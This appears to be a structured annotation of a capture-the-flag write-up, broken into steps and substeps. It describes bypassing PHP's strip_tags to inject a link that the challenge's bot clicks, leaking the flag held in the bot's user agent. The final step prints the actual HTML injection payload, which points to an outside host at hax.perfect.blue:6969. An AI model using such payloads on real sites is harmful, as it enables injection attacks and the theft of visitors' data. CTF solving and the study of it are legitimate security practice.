Steps.StepString: Used the php bug to bypass strip_tags and inject an 'a' tag.

Substeps.SubstepString: Bypassed strip_tags using the PHP bug.

Steps.StepString: Injected an 'a' tag with the id=like since the bot clicks this element.

Substeps.SubstepString: Added the id=like to the injected 'a' tag.

Steps.StepString: Flag was in the user agent so bot clicking our link gave us the flag.

Substeps.SubstepString: Flag was in the user agent.
Bot clicking our link gave us the flag.

Steps.StepString: Injected the following code to make the bot click our link and reveal the flag: [[lol"></audio><a/udio id="like" href="http://hax.perfect.blue:6969/lel">HAXXX<audio src="]]

Substeps.SubstepString: Injected the code to make the bot click our link and reveal the flag.
